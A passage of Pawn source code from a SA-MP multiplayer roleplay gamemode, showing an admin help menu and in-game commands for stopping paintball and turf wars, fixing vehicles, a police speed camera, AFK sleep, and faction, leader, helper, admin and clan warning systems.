							SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 2  *** /freezall /unfreezeall /checkweapons /o(oc) /skydive"); }  }
					else if(strcmp(x_nr,"3",true) == 0) {
						if (PlayerInfo[playerid][pAdmin] >= 3) {
							SCM(playerid, CRISTIAN,"_______________________________________");
							SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 3  *** /dv /rtc /respawncar /fixveh /sbiz /agl /veh /favm /vehn /vehe");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 3  *** /setjob /mark /gotomark /tp /gg /freeze /ram /ravm /racm /atakegun");}  }
					else if(strcmp(x_nr,"4",true) == 0) {
						if (PlayerInfo[playerid][pAdmin] >= 4) {
							SCM(playerid, CRISTIAN,"_______________________________________");
							SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 4  *** /lockengine /unlockengine /amodveh/vehcolor /gotopveh /nitro /vehslap /fav ");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 4  *** /superslap /entercar /getcar /sethp/setarmor /jetpack /jetpackto /rjetpack /rpfv");}  }
					else if(strcmp(x_nr,"5",true) == 0) {
						if (PlayerInfo[playerid][pAdmin] >= 5) {
							SCM(playerid, CRISTIAN,"_______________________________________");
							SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 5 *** /sethpall /setarmorall /racd /afill /dva /unjail /getip /afcheck /clearwanted");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 5 *** /cnn /tod /setskin /fuelcars /veh/weather /weatherall /getmoney /unwarn /intx /ints");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 5 *** /surf /surflist /unsurf /hell");						}  }
					else if(strcmp(x_nr,"6",true) == 0) {
						if (PlayerInfo[playerid][pAdmin] >= 6) {
							SCM(playerid, CRISTIAN,"_______________________________________");
							SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 6 ***  /rac /qool /qoolto /asellcar /house /biz /edit /givepre /nofind");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 6 ***  /fourdive /ffnn /mc /gotocar /takegunall /ggall /rav /makeleader"); }  }
					else if(strcmp(x_nr,"7",true) == 0) {
						if (PlayerInfo[playerid][pAdmin] >= 7) {
							SCM(playerid, CRISTIAN,"_______________________________________");
							SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 7 ***  /payday /reporton /reportoff /saveaccounts /anw");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 7 ***  /changenick /gotohint /agivemats /agivedr /movehouse /exph /movebiz /movesbiz /recovery");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 7 ***  /asellbiz /asellsbiz /asellhouse /bigears /makehelper /setmoney /givemoney ");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 7 ***  /stopwar /cwar /stoppb /givegold /level/getpre /setapp /giveapp");}  }
							else if(strcmp(x_nr,"8",true) == 0) {
						if (PlayerInfo[playerid][pAdmin] >= 8) {
							SCM(playerid, CRISTIAN,"_______________________________________");
							SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 9 Ta 12 ***  /surfsv /setstat /makeadmin /aav /lav /hav /unlav /unhav /unaav /setdays /unbanvps /muteall /safezone");
							SCM(playerid, COLOR_GRAD2,"*** Admin Level 8 Ta 12  *** /makeadmin  /removeezdevaj /setmoney /cheat");
							}
							}
					else
					SCM(playerid, COLOR_CRS3, "** Invalid number.");
					return 1; }
				else
				SCM(playerid, COLOR_CRS3, "** You are not admin.");
				return 1; }
			return 1; }
    	if(!strcmp(cmd,"/stoppb",true))
	{
         if(PINFO[playerid][pAdmin] < 5) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
         for(new i;i<LastPID;i++)
	        {
	            if(IsPlayerConnected(i))
	            {
	                if(OnPaintBall[i] != 0)
	                {
	                    ResetPlayerTofang(i);
			        	//format(sttr,512,"Paintball finished. Winner is: %s with %i kills",PINFO[winner][pName],record);
		          		//SCM(i,COLOR_WHITE,sttr);
		          		StopPaintBalling();
		          	}
		        }
	     	}
	     	new lolstr[256];
	        format(lolstr, 256, "Admin %s has Stopped PaintBall.", PINFO[playerid][pName]);
	        AdminWarn(lolstr);
	        return 1;
	}
		 if(!strcmp(cmd, "/stopwar", true))
    {
        if(PINFO[playerid][pAdmin] < 7) return SCM(playerid, COLOR_GREEN, "Admin Level Shoma Baraye In CMD Kafi Nist.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /stopwar  <WarID>");
        new turfid = strval(tmp);

		for(new i=0;i<Akharish;i++) {
		if(OnWar[i] == turfid) {


		//TextDrawHideForPlayer(i, WarBox);
	////	TextDrawHideForPlayer(i, WarA[OnWar[i]]);
		//TextDrawHideForPlayer(i, WarVS);
		//TextDrawHideForPlayer(i, WarD[OnWar[i]]);
		//PlayerTextDrawHide(i, WarK);
		//PlayerTextDrawHide(i, WarDea);
		//PlayerTextDrawHide(i, WarS);
		//PlayerTextDrawHide(i, WarT);
		//TextDrawHideForPlayer(i, WarTR[OnWar[i]]);
		OnWar[i] = 9999;
		}
		}
		KillsAttackerTurf[turfid] = 0;
		DeathsAttackerTurf[turfid] = 0;
		KillsKhodTurf[turfid] = 0;
		DeathsKhodTurf[turfid] = 0;

		ScoreAttacker[turfid] = 0;
		ScoreKhod[turfid] = 0;
		TurfAttacker[turfid] = 9999;
		TurfKhod[turfid] = 9999;
		TurfTime[turfid] = 0;
		new string[512];
		format(string, sizeof(string), "{FFFFFF}War on turfid %d has been stopped by admin %s.",turfid,PINFO[playerid][pName]);
		AdminWarn(string);
        return 1;
    }
	if(strcmp(cmd, "/fixveh", true) == 0 || strcmp(cmd, "/vehfix", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] <= 2)
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
                return 1;
            }
            if(IsPlayerInAnyVehicle(playerid))
            {
                RepairVehicleEx(GetPlayerVehicleID(playerid));
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "Vehicle Fixed.");
           		new strs[500];
				GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
				format(strs,500,"{FFFFFF}Admin %s[%i] Mashin Khod ra Fix Kard.",giveplayer,playerid);
				AdminWarn(strs);
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/speedc", true) == 0)
    {
    if(!IsAPDMember(playerid)) return SCM(playerid,COLOR_BLUE,"You are not a Police Department.");
    if(OnDuty[playerid] != 1) return SCM(playerid,COLOR_BLUE,"You are not On-Duty.");
    new newcar = GetPlayerVehicleID(playerid);
    if(IsACopCar(newcar))
    {
    if(OnSpeedc[playerid] == 0)
    {
    if(EngineSTATE[newcar] == 0)
    {
    tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /speedc <MaxSpeed>");
                return 1;
            }
            new speed;
            speed = strval(tmp);
    if(speed < 90 || speed > 230)
    {
    SCM(playerid,COLOR_ALI,"Error: Use a MaxSpeed between 90 and 230");
    return 1;
    }
    SCM(playerid,COLOR_ALI,"Speed Camera {FFFFFF}Enabled, use /engine to disable it or leave the car.");
    OnSpeedc[playerid] = 1;
    SpeedTimer[playerid] = SetTimerEx("speedcheck",1000,1,"ii",playerid,speed);
    SpeedTimerUsed[playerid] = true;
    }
    else
    {
    return SCM(playerid,COLOR_ALI,"First Engine off your vehicle.");
    }
    }
    else
    {
    return SCM(playerid,COLOR_ALI,"You already on speed camera system.");
    }
    }
    else
    {
    return SCM(playerid,COLOR_ALI,"You are not in a Cop Car.");
    }
    return 1;
    }
    //--------------------------- Away from keyboard -------------------------------
    if(strcmp(cmd,"/sleep",true) == 0)
    {
        if(PINFO[playerid][pPhousekey] == 9999)
        {
            SCM(playerid,COL_SYN,"You don't buy/rent a House");
            return 1;
        }
        if(TooHouse[playerid] == 9999) return SCM(playerid, COLOR_ALI, "You are not at home.");
            if(AFK[playerid] == 0)
            {
                if(TooHouse[playerid] != 9999)
                {
                    if(GetPlayerWantedLevel(playerid) >= 1) return SCM(playerid, COLOR_LIGHTRED, "Shoma Wanted Darid Va Nemitavanid Sleep Konid.");
                    AFK[playerid] = 1;
                    oldColor[playerid] = GetPlayerColor(playerid);
                    TogglePlayerControllable(playerid, 0);
                    SetPlayerColor(playerid,COLOR_AFK);
                    LoopingAnim(playerid,"CRACK","crckidle2",4.0,0,0,0,1,0);
                   	PlayerInfo[playerid][pOnline] = 2;
                    SaveKonVal(playerid, "pOnline", 2);
                }
                else
                {
                    SendClientMessage(playerid, COLOR_RED, "You are not at home!");
                }
            }
            else
            {
                if(AFK[playerid] == 1)
                {
                    TogglePlayerControllable(playerid,1);
                    LoopingAnim(playerid, "SUNBATHE", "Lay_Bac_out", 4.0, 0, 0, 0, 0, 0);
                    SetPlayerColor(playerid,oldColor[playerid]);
                    AFK[playerid] = 0;
                   	PlayerInfo[playerid][pOnline] = 1;
                    SaveKonVal(playerid, "pOnline", 1);
                    return 1;
                }
            }
        return 1;
    }
//----------------------------------[FACTION-WARN]----------------------------------------------
if(strcmp(cmd, "/fw", true) == 0 || strcmp(cmd, "/factionwarn", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pLeader] >= 1 || PlayerInfo[playerid][pRank] >= 6)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /f(action)w(arn) <PlayerID/PartOfName>");
                return 1;
            }
            new para1;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot fwarned your self.");
            return 1;
            }
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        if(PlayerInfo[para1][pLeader] == 0)
                        {
                            if(PlayerInfo[para1][pMember] >= 1 && (PlayerInfo[playerid][pLeader] == PlayerInfo[para1][pMember] || (PlayerInfo[playerid][pMember] >= 1 && PlayerInfo[playerid][pRank] >= 6 && PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])))
                            {
                            new famil;
                            if(PlayerInfo[playerid][pMember]) { famil = PlayerInfo[playerid][pMember]; }
                            else { famil = PlayerInfo[playerid][pLeader]; }
                                GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                PlayerInfo[para1][pFwarn] = PlayerInfo[para1][pFwarn] + 1;
                                SaveKonVal(para1, "pFwarn", PINFO[para1][pFwarn]);
                                format(string, sizeof(string), "You have been FactionWarned by Leader %s", sendername);
                                SendClientMessage(para1, COLOR_LIGHTRED, string);
                                format(string, sizeof(string), "You have FactionWarned %s.", giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTRED, string);
                                new year, month,day;
                                getdate(year, month, day);
                                format(string, sizeof(string), "%s have been warned %s in faction id %d (%d-%d-%d)",sendername,giveplayer,famil,month,day,year);
                                FactionLog(string);
                                if(PlayerInfo[para1][pFwarn] >= 3)
                                {
                                    PlayerInfo[para1][pPunish] = 60;
                                    SaveKonVal(para1, "pPunish", 60);
                                    //printf("AdmCmd: %s kicked from Family/faction because had 3 fwarns.", sendername, giveplayer);
                                    SendClientMessage(para1, COLOR_LIGHTBLUE, "* You have been kicked from a Family / faction because you had 3 fwarns.");
                                    SendClientMessage(para1, COLOR_LIGHTBLUE, "* You are now a Civilian again.");
                                    //gTeam[para1] = TEAM_CIV;
                                    PlayerInfo[para1][pTeam] = TEAM_CIV;
                                    SaveKonVal(para1, "pTeam", TEAM_CIV);
                                    PlayerInfo[para1][pMember] = 0;
                                    SaveKonVal(para1, "pMember", 0);
                                    PlayerInfo[para1][pRank] = 0;
                                    SaveKonVal(para1, "pRank", 0);
                                    PlayerInfo[para1][pFwarn] = 0;
                                    SaveKonVal(para1, "pFwarn", 0);
                                    PlayerInfo[para1][fSkin] = 170;
                                    SaveKonVal(para1, "fSkin", 170);
                                    MedicBill[para1] = 0;
                                    ResetPlayerTofang(para1);
                                    SetSpawnKol(para1);
                                    SpawnPlayer(para1);
                                    format(string, sizeof(string), "%s have been kicked from faction  id %d because have had 3 fwarns (%d-%d-%d)",giveplayer,famil,month,day,year);
                                    FactionLog(string);
                                }
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GRAD2, "This player isn't in your faction.");
                            }
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "You cannot fwarn the leader.");
                        }
                    }
                }
                else
                {
                SCM(playerid,COLOR_WHITE,"Player not connected.");
                return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "Only leaders can use this command.");
                return 1;
            }
        }
        return 1;
    }
    //////////////////////////////////LeaderWarn///////////////////////////////

	if(strcmp(cmd, "/lav", true) == 0 || strcmp(cmd, "/leaderav", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] > 6)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /l(eader)av <PlayerID/PartOfName>");
                return 1;
            }
            new para1;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot leaderaved your self.");
            return 1;
            }
			if(PlayerInfo[para1][pLeader] == 0)
            {
            SCM(playerid,COLOR_ALI,"he/she is not a leader");
            return 1;
            }
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                                GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                PlayerInfo[para1][pLav] = PlayerInfo[para1][pLav] + 1;
                                SaveKonVal(para1, "pLav", PINFO[para1][pLav]);
                                format(string, sizeof(string), "You have been LeaderWarned By Admin %s", sendername);
                                SendClientMessage(para1, COLOR_LIGHTRED, string);
                                format(string, sizeof(string), "You have LeaderWarned %s.", giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTRED, string);
                                new year, month,day;
                                getdate(year, month, day);
                                format(string, sizeof(string), "%s have been warned %s in Leader Av (%d-%d-%d)",sendername,giveplayer,month,day,year);
                                FactionLog(string);
                                if(PlayerInfo[para1][pLav] >= 3)
                                {
                                    printf("AdmCmd: %s kicked %s from Family/faction leader because had 3 Lav.", sendername, giveplayer);
                                    SendClientMessage(para1, COLOR_LIGHTBLUE, "* You have been kicked from a Family / faction Leader because you had 3 leader av.");
                                    SendClientMessage(para1, COLOR_LIGHTBLUE, "* You are now a Civilian again.");
                                    //gTeam[para1] = TEAM_CIV;
									new famil = PlayerInfo[para1][pLeader];
                                    PlayerInfo[para1][pTeam] = TEAM_CIV;
                                    SaveKonVal(para1, "pTeam", TEAM_CIV);
                                    PlayerInfo[para1][pLeader] = 0;
                                    SaveKonVal(para1, "pLeader", 0);
                                    PlayerInfo[para1][pLav] = 0;
                                    SaveKonVal(para1, "pLav", 0);
                                    PlayerInfo[para1][fSkin] = 170;
                                    SaveKonVal(para1, "fSkin", 170);
                                    MedicBill[para1] = 0;
                                    ResetPlayerTofang(para1);
                                    SetSpawnKol(para1);
                                    SpawnPlayer(para1);
                                    format(string, sizeof(string), "%s have been kicked from faction leader  id %d because have had 3 leader warns (%d-%d-%d)",giveplayer,famil,month,day,year);
									ABroadCast(COLOR_AdminWarn,string,1)
                                }
                    }
                }
                else
                {
                SCM(playerid,COLOR_WHITE,"Player not connected.");
                return 1;
                }
            }
            else
            {
                SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use that command.");
                return 1;
            }
        }
        return 1;
    }
	////////////////////////////////////////////////////////////////////////////

	    //////////////////////////////////HelperWarn///////////////////////////////

	if(strcmp(cmd, "/hav", true) == 0 || strcmp(cmd, "/helperav", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] > 6)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /h(elper)av <PlayerID/PartOfName>");
                return 1;
            }
            new para1;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot HelperAved your self.");
            return 1;
            }
			if(PlayerInfo[para1][pHelper] == 0)
            {
            SCM(playerid,COLOR_ALI,"he/she is not a helper");
            return 1;
            }
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                                GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                PlayerInfo[para1][pHav] = PlayerInfo[para1][pHav] + 1;
                                SaveKonVal(para1, "pHav", PINFO[para1][pHav]);
                                format(string, sizeof(string), "You have been HelperWarned By Admin %s", sendername);
                                SendClientMessage(para1, COLOR_LIGHTRED, string);
                                format(string, sizeof(string), "You have HelperWarned %s.", giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTRED, string);
                                new year, month,day;
                                getdate(year, month, day);
                                format(string, sizeof(string), "%s have been warned %s in Helper Av (%d-%d-%d)",sendername,giveplayer,month,day,year);
                                if(PlayerInfo[para1][pHav] >= 3)
                                {
                                    printf("AdmCmd: %s kicked %s from Helper because had 3 Hav.", sendername, giveplayer);
                                    SendClientMessage(para1, COLOR_LIGHTBLUE, "* You have been kicked from Helper because you had 3 Helperrrrrr av.");
                                    //gTeam[para1] = TEAM_CIV;
                                    PlayerInfo[para1][pHelper] = 0;
                                    SaveKonVal(para1, "pHelper", 0);
                                    PlayerInfo[para1][pHav] = 0;
                                    SaveKonVal(para1, "pHav", 0);
                                    MedicBill[para1] = 0;
                                    ResetPlayerTofang(para1);
                                    SetSpawnKol(para1);
                                    SpawnPlayer(para1);
                                    format(string, sizeof(string), "%s have been kicked from Helper  because have had 3 Helper warns (%d-%d-%d)",giveplayer,month,day,year);
									ABroadCast(COLOR_AdminWarn,string,1)
                                }
                    }
                }
                else
                {
                SCM(playerid,COLOR_WHITE,"Player not connected.");
                return 1;
                }
            }
            else
            {
                SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use that command.");
                return 1;
            }
        }
        return 1;
    }
	////////////////////////////////////////////////////////////////////////////


	    //////////////////////////////////AdminWarn///////////////////////////////

	if(strcmp(cmd, "/Aav", true) == 0 || strcmp(cmd, "/adminav", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] > 8)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /a(dmin)av <PlayerID/PartOfName>");
                return 1;
            }
            new para1;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot AdminAved your self.");
            return 1;
            }
			if(PlayerInfo[para1][pAdmin] == 0)
            {
            SCM(playerid,COLOR_ALI,"he/she is not a Admin");
            return 1;
            }
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                                GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                PlayerInfo[para1][pAav] = PlayerInfo[para1][pAav] + 1;
                                SaveKonVal(para1, "pAav", PINFO[para1][pAav]);
                                format(string, sizeof(string), "You have been AdminWarned By Admin %s", sendername);
                                SendClientMessage(para1, COLOR_LIGHTRED, string);
                                format(string, sizeof(string), "You have AdminWarned %s.", giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTRED, string);
                                new year, month,day;
                                getdate(year, month, day);
                                format(string, sizeof(string), "%s have been warned %s in Admin Av (%d-%d-%d)",sendername,giveplayer,month,day,year);
                                if(PlayerInfo[para1][pAav] >= 5)
                                {
                                    printf("AdmCmd: %s kicked %s from Admin because had 5 Aav.", sendername, giveplayer);
                                    SendClientMessage(para1, COLOR_LIGHTBLUE, "* You have been kicked from Admin because you had 5 Admin av.");
                                    //gTeam[para1] = TEAM_CIV;
                                    PlayerInfo[para1][pAdmin] = 0;
                                    SaveKonVal(para1, "pAdmin", 0);
                                    PlayerInfo[para1][pAav] = 0;
                                    SaveKonVal(para1, "pAav", 0);
                                    MedicBill[para1] = 0;
                                    ResetPlayerTofang(para1);
                                    SetSpawnKol(para1);
                                    SpawnPlayer(para1);
                                    format(string, sizeof(string), "%s have been kicked from Admin because have had 5 Admin warns (%d-%d-%d)",giveplayer,month,day,year);
									ABroadCast(COLOR_AdminWarn,string,1)
                                }
                    }
                }
                else
                {
                SCM(playerid,COLOR_WHITE,"Player not connected.");
                return 1;
                }
            }
            else
            {
                SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use that command.");
                return 1;
            }
        }
        return 1;
    }
    	if(strcmp(cmd, "/unaav", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /unaav <playerid/PartOfName> <reason>");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 9)
            {
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));

                        new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
      new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                            result[idx - offset] = cmdtext[idx];
                            idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COL_SYN, "Syntax: /unaav <playerid/PartOfName> <reason>");
                            return 1;
                        }
						if(PlayerInfo[giveplayerid][pAdmin] == 0) return SCM(playerid, COLOR_RED, "error: he/she is not admin");
						if(PlayerInfo[giveplayerid][pAav] == 0) return SCM(playerid, COLOR_LIGHTRED, "Error: your target has not admin warns");
                        PlayerInfo[giveplayerid][pAav] -= 1;
                        SaveKonVal(giveplayerid, "pAav", PINFO[giveplayerid][pAav]);
                        if(PlayerInfo[giveplayerid][pAav] >= 0)
                        {
                            format(string, sizeof(string), "[AdminWarn]: Admin %s unAdminwarned %s, reason: %s", sendername, giveplayer, (result));
                            SendClientMessage(playerid, COLOR_AdminWarn, string);
                            format(string, sizeof(string), "You were unAdmin warned by %s, reason: %s", sendername, (result));
                            SendClientMessage(giveplayerid, COLOR_LIGHTRED, string);
                            return 1;
                        }

                    }
                }//not connected
            }
            else
            {
                format(string, sizeof(string), "That player is offline.");
                SendClientMessage(playerid, COLOR_GRAD1, string);
            }
        }
        return 1;
    }
	////////////////////////////////////////////////////////////////////////////
if(strcmp(cmd, "/clanw", true) == 0 || strcmp(cmd, "/clanwarn", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pClan] >= 7 || PlayerInfo[playerid][pcRank] >= 7)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /clanw(arn) <PlayerID/PartOfName>");
                return 1;
            }
            new para1;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot cwarned your self.");
            return 1;
            }
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                            if(PlayerInfo[playerid][pClan] == PlayerInfo[para1][pClan])
                            {
                            new famil;
                            if(PlayerInfo[playerid][pClan]) { famil = PlayerInfo[playerid][pClan]; }
                                GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                PlayerInfo[para1][pCwarn] = PlayerInfo[para1][pCwarn] + 1;
                                SaveKonVal(para1, "pCwarn", PINFO[para1][pCwarn]);
                                format(string, sizeof(string), "You have been ClanWarned by Leader %s", sendername);
                                SendClientMessage(para1, COLOR_LIGHTRED, string);
                                format(string, sizeof(string), "You have ClanWarned %s.", giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTRED, string);
                                new year, month,day;
                                getdate(year, month, day);
                                format(string, sizeof(string), "%s have been warned %s in ClanWarned id %d (%d-%d-%d)",sendername,giveplayer,famil,month,day,year);
                                if(PlayerInfo[para1][pCwarn] >= 3)
                                {
                                    //printf("AdmCmd: %s kicked from Family/faction because had 3 fwarns.", sendername, giveplayer);
                                    SendClientMessage(para1, COLOR_LIGHTBLUE, "* You have been kicked from a Clan because you had 3 cwarns.");
                                    SendClientMessage(para1, COLOR_LIGHTBLUE, "* You haven't clan now.");
                                    //gTeam[para1] = TEAM_CIV;
                                    PlayerInfo[para1][pClan] = 0;
                                    SaveKonVal(para1, "pClan", 0);
                                    PlayerInfo[para1][pcRank] = 0;
                                    SaveKonVal(para1, "pcRank", 0);
                                    PlayerInfo[para1][pCwarn] = 0;
                                    SaveKonVal(para1, "pCwarn", 0);
				    new c = PlayerInfo[playerid][pClan];
	  		       	    new clan = DynamicClans[c][cSQLid];
				    new querys[512];
				    format(querys,sizeof(querys),"UPDATE `clans` SET cSlot=cSlot-'1' WHERE cSQLid='%d'",clan);
				    mysql_function_query(handle, querys, false, "SendQuery", "");
                                    format(string, sizeof(string), "%s have been kicked from clan id %d because have had 3 cwarns (%d-%d-%d)",giveplayer,famil,month,day,year);
                                }
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GRAD2, "This player isn't in your clan.");
                            }
                        }
                    }
                }
                else
                {
                SCM(playerid,COLOR_WHITE,"Player not connected.");
                return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "Only leaders can use this command.");
                return 1;
            }
        return 1;
    }
   if(strcmp(cmd, "/clanuw", true) == 0 || strcmp(cmd, "/clanunwarn", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pClan] >= 7 || PlayerInfo[playerid][pcRank] >= 7)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /clanunw(arn) <PlayerID/PartOfName>");
                return 1;
            }
            new para1;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot cunwarned your self.");
            return 1;
            }
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                            if(PlayerInfo[playerid][pClan] == PlayerInfo[para1][pClan])
                            {
                            new famil;
                            if(PlayerInfo[playerid][pClan]) { famil = PlayerInfo[playerid][pClan]; }
                                GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                PlayerInfo[para1][pCwarn] = PlayerInfo[para1][pCwarn] - 1;
                                SaveKonVal(para1, "pCwarn", PINFO[para1][pCwarn]);
                                format(string, sizeof(string), "You have been UnClanWarned by Leader %s", sendername);
                                SendClientMessage(para1, COLOR_LIGHTRED, string);
                                format(string, sizeof(string), "You have ClanUnWarned %s.", giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTRED, string);
                                new year, month,day;
                                getdate(year, month, day);
                                format(string, sizeof(string), "%s have been unwarned %s in ClanUnWarned id %d (%d-%d-%d)",sendername,giveplayer,famil,month,day,year);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GRAD2, "This player isn't in your clan.");
                            }
                        }
                    }
                }
                else
                {
                SCM(playerid,COLOR_WHITE,"Player not connected.");
                return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "Only leaders can use this command.");
                return 1;
            }
        return 1;
    }
    if(strcmp(cmd, "/fuw", true) == 0 || strcmp(cmd, "/factionunwarn", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if (PlayerInfo[playerid][pLeader] >= 1 || PINFO[playerid][pRank] >= 6)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /f(action)u(n)w(arn) <PlayerID/PartOfName>");
                return 1;
            }
            new para1;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot unfwarn your self.");
            return 1;
            }
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        if(PlayerInfo[para1][pLeader] == 0)
                        {
                            if(PlayerInfo[para1][pMember] >= 1 && (PlayerInfo[playerid][pLeader] == PlayerInfo[para1][pMember] || (PINFO[playerid][pMember] >= 1 && PINFO[playerid][pRank] >= 6 && PINFO[playerid][pMember] == PlayerInfo[para1][pMember])))
                            {
                            new famil;
                            if(PlayerInfo[playerid][pMember]) { famil = PlayerInfo[playerid][pMember]; }
                            else { famil = PlayerInfo[playerid][pLeader]; }
                                GetPlayerName(para1, giveplayer, sizeof(giveplayer));
